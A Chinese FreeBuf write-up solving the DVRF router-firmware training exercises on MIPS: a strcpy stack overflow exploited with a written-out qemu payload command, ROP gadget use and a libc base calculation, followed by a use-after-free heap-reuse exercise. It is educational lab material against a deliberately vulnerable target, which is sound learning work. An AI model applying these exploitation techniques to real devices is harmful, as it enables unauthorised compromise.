*****本文作者：kczwa1，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**  
**

 **这个项目的目的是来帮助人们学习X86_64之外其他架构环境，同时还帮助人们探索路由器固件里面的奥秘。**  

**本文通过练习DVRF 中INTRO 部分的题目来学习下MIPS 结构下的各种内存攻击。  
**

DVRF：[路由器漏洞练习靶机](https://github.com/praetorian-inc/DVRF)  

用binwalk解压DVRFbin后，题目位于如下目录中  

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/15197952723622.png!small)

调试环境配置参考本系列中的前面两篇文章：

> [通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃](http://www.freebuf.com/vuls/160040.html)  
>
>
> [路由器漏洞复现分析第二弹：CNVD-2018-01084](http://www.freebuf.com/vuls/162627.html)

\-----------------------------------------------------------------------------------------------------------------------------------------------------------
###  **第一个题目stack_bof_01**

    
    
     printf("Welcome to the first BoF exercise!\r\n\r\n"); 
    
    strcpy(buf, argv[1]);
    
    printf("You entered %s \r\n", buf);
    
    printf("Try Again\r\n");
    
    return 0x41; // Just so you can see what register is populated for return statements
    
    }

可以看到strcpy处有栈溢出，main函数为非叶子函数，返回地址ra会被存放在栈中;

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/15198005223260.png!small)  

strcpy拷贝的变量目标地址放在变量VAR_D0处

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/1519800591175.png!small)

因此如果要覆盖掉ra需要0xd0-0x4=204长度的字符，再接我们需要跳转的地址,

希望的覆盖地址如下如为dat_shell的地址0x400950：

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/1519802727332.png!small)

调试命令如下：  

    
    
    sudo chroot . ./qemu  -g 1235 ./pwnable/Intro/stack_bof_01 "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb`echo -e '\x50\x09\x40'`"

可以看到当main要返回的时候返回地址已经被覆盖为0x400950：

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/15198031433924.png!small)

当运行到dat_shell里面时出现错误：  

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/15198041858312.png!small)

Mips中函数的调用通常是jar $t9格式，因此t9保存的是函数的地址，因为我们是直接通过jr
ra过来的，所以此处的t9值并不是函数地址因此会出错。我们需要找一个gadget让t9中保存函数的起始地址 。通过gadget搜索，找到：

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/15198178776611.png!small)

将栈中地址复制到t9并跳转到t9.

此时要先找到libc的基地址，进入任意一个libc的提供的函数，列如memset：

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/15198156894455.png!small)

找到memset函数的起始地址：

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/1519817910990.png!small)

再用看下ida中memset的偏移：

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/15198179245537.png!small)

那 libc_base=0x76700E10-0x0001BE10

那 address=libc_base+6b20= 0x766EBB20

最后的命令和执行结果如图：

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/15198179428605.png!small)

\------------------------------------------------------------------------------------------------------------------------------------------------------------
### 第二个题目 uaf_01

    
    
    heap_of = malloc(sizeof(message)); 
    
    strncpy(heap_of,message,sizeof(message));
    
    printf("Heap Address 1 of 17 bytes: %p\r\n", heap_of);
    
    free(heap_of);
    
    int size = strlen(argv[1]);
    
    heap_of2 = malloc(size);
    
    printf("Heap Address 2 of %d bytes: %p \r\n", size, heap_of2);
    
    printf("Copying contents of argv[1] to Heap Address 2\r\n\r\n");
    
    strncpy(heap_of2, argv[1], size);
    
    if (heap_of2 != heap_of){
    
    exit(1);
    
    }
    
    else{
    
    printf("Awesome! :D\r\n");
    
    free(heap_of2);
    
    }

从c代码看,只要heap_of;heap_of2两个字符串指针的地址相同就可以走到正确的分支.

第一个内存分配内存后如图:  

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/15198076501985.png!small)

拷贝第一个字符串后：

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/15198077298813.png!small)  

Free掉第一个变量后：

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/15198077681179.png!small)

此时再按输入的参数长度分配第二块内存,如果输入的参数长度不够长,那么就在free掉的第一块内存里取一块,如图,v0是malloc返回的地址：

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/15198078328123.png!small)

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/15198078496142.png!small)

此时，两次分配的地址不一样，程序走到错误分析。

当参数长度大于等于13时,第二次malloc的内存是第一次malloc的地址,走到正确分支

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/15198079035744.png!small)

使用的命令如图  

![路由器漏洞复现分析第三弹：DVRF
INTRO题目分析](https://image.3001.net/images/20180228/15198079179742.png!small)

***本文作者：kczwa1，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

